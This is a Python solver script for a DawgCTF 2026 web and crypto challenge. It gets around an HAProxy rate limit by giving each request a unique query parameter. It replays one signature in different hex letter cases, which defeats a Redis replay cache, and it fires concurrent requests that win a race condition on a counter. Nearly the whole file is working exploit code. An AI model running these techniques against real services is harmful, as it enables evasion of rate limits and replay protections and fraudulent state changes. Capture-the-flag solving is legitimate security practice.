#!/usr/bin/env python3
"""
Hens and Roosters — DawgCTF 2026 (crypto/web, 352pts)

Two-part attack:
1. HAProxy rate limit bypass: tracks by URL, so adding unique query params
   (/work?_=1, /work?_=2) creates separate rate limit buckets.
2. Hex case variant attack: Redis caches sigs by hex STRING, but bytes.fromhex()
   is case-insensitive. Different case = different cache key, same signature bytes.

Combined: send 7+ concurrent requests with different query params AND
different hex case variants. All read studs=0 before any increment (verify is slow).
"""
import requests
import sys
import time
import concurrent.futures

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://hensandroosters.crypto.ctf.umasscybersec.org"
BASE = BASE.rstrip('/')

def step(n, msg):
    print(f"[{n}] {msg}")

# Step 1: Get a UID (use unique query param to avoid rate limit from prior attempts)
step(1, "Getting UID...")
ts = int(time.time())
r = requests.get(f"{BASE}/?t={ts}", timeout=120)
if "429" in r.text:
    step(1, "Rate limited on /. Waiting 21s...")
    time.sleep(21)
    r = requests.get(f"{BASE}/?t={ts+1}", timeout=120)
uid = r.text.split("uid is ")[1].strip().rstrip("!")
step(1, f"UID: {uid}")

# Step 2: Get free signature for "0|uid"
step(2, "Getting free signature...")
r = requests.get(f"{BASE}/buy?uid={uid}&t={ts}", timeout=120)
if "504" in r.text or "429" in r.text:
    step(2, f"Error: {r.text[:80]}. Retrying in 21s...")
    time.sleep(21)
    r = requests.get(f"{BASE}/buy?uid={uid}&t={ts+1}", timeout=120)
if "free signature:" not in r.text:
    step(2, f"Failed: {r.text[:150]}")
    sys.exit(1)
sig = r.text.split("free signature: ")[1].strip()
step(2, f"Got sig ({len(sig)} chars): {sig[:40]}...")

# Step 3: Generate case variants
letter_positions = [i for i, c in enumerate(sig) if c in 'abcdef']
step(3, f"{len(letter_positions)} hex letter positions available")

def make_variant(sig, positions, mask):
    chars = list(sig)
    for i, pos in enumerate(positions):
        if mask & (1 << i):
            chars[pos] = chars[pos].upper()
    return ''.join(chars)

# Generate enough variants (need at least 7)
n_bits = min(5, len(letter_positions))
positions_to_flip = letter_positions[:n_bits]
NUM_VARIANTS = min(2 ** n_bits, 20)
variants = [make_variant(sig, positions_to_flip, mask) for mask in range(NUM_VARIANTS)]

# Verify all produce same bytes
base_bytes = bytes.fromhex(variants[0])
assert all(bytes.fromhex(v) == base_bytes for v in variants), "Variant mismatch!"
assert all(b < 128 for b in base_bytes), "Byte range check failed!"
step(3, f"Generated {NUM_VARIANTS} valid variants ✓")

# Step 4: Send ALL variants concurrently with unique query params to bypass rate limit
N = min(10, NUM_VARIANTS)
step(4, f"Sending {N} concurrent /work requests...")

def submit_work(i, variant_sig):
    """Each request uses a unique query param to bypass haproxy rate limit"""
    try:
        url = f"{BASE}/work?_={i}&t={ts}"
        r = requests.post(url, json={"uid": uid, "sig": variant_sig}, timeout=120)
        return r.text
    except Exception as e:
        return f"ERROR: {e}"

with concurrent.futures.ThreadPoolExecutor(max_workers=N) as executor:
    futures = {executor.submit(submit_work, i, variants[i]): i for i in range(N)}
    results = {}
    for f in concurrent.futures.as_completed(futures):
        idx = futures[f]
        results[idx] = f.result()

successes = 0
for i in sorted(results):
    r = results[i]
    ok = "free stud" in r or "not getting" in r
    if ok:
        successes += 1
    tag = "✓" if ok else "✗"
    print(f"    [{tag}] #{i}: {r[:80]}")

step(4, f"Successful increments: {successes}")

# Step 5: Get flag
time.sleep(1)
step(5, "Checking flag...")
r = requests.get(f"{BASE}/buy?uid={uid}&t={ts+2}", timeout=120)
print(f"    {r.text}")

if "UMASS{" in r.text:
    flag = r.text.split("lego set: ")[1].strip() if "lego set:" in r.text else r.text
    print(f"\n[+] FLAG: {flag}")
elif "stud" in r.text.lower():
    step(5, f"Not enough studs. Got {successes} increments, need 7.")
    # Retry with more variants if needed
    if successes < 7:
        step(6, f"Need {7-successes} more. Sending additional batch...")
        time.sleep(21)  # wait for rate limit reset
        extra_start = N
        extra_n = min(7 - successes + 3, NUM_VARIANTS - N)  # send extra
        if extra_n > 0:
            # Need to read current studs and get a valid sig for current level
            # This gets complicated - re-get free sig for current level
            r2 = requests.get(f"{BASE}/buy?uid={uid}&t={ts+3}", timeout=120)
            print(f"    Current state: {r2.text[:100]}")
